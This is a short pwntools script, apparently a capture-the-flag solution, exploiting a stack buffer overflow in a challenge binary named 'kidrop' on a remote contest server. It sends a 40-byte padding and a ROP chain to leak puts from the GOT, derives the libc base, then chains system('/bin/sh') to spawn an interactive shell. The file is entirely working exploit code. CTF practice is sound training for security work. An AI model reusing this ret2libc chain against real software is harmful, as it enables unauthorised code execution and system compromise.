from pwn import *

##threshold: 40 for just nice null byte override

context.arch = 'amd64'
elf = ELF("./kidrop")
libc = ELF("./libc.so.6")
#p = elf.process()
p = remote("challs1.nusgreyhats.org", 5013)

##first rop chain finds the binary's puts in the global offset table
rop = ROP(elf)
rop.call("puts", [elf.got['puts']])
rop.call("main")

payload = [
    b"A" * 40, \
    rop.chain()
]

payload = b"".join(payload)
print(payload)

p.recvuntil(b"How are you?\n")
p.sendline(payload)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b'\x00'))
print(puts)

##find libc base by subtracting libc's puts from binary's global offset table puts
##adjust the whole libc elf to suit binary's env
libc.address = puts - libc.symbols["puts"]

rop = ROP(libc)
rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

payload = [
    b"A" * 40, \
    rop.chain()
]

payload = b"".join(payload)
print(payload)

p.recvuntil(b"How are you?\n")
p.sendline(payload)

p.interactive()
